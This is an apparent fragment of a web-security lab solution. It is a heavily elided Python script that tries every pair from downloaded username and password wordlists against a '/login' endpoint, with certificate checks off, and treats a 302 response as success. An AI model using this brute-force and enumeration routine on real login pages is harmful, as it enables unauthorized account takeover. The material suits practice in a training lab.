...
First download auth-lab-usernames and auth-lab-passwords and rename them to usernames.txt and passwords.txt respectively
...
def user_enum(url):
    ...
    for i in users:
        for j in pwd:
            ...
            r = requests.post(url + '/login', verify=False, data=data)
            if (r.status_code == 302):
                print("(+) Username Enumeration Successful!")
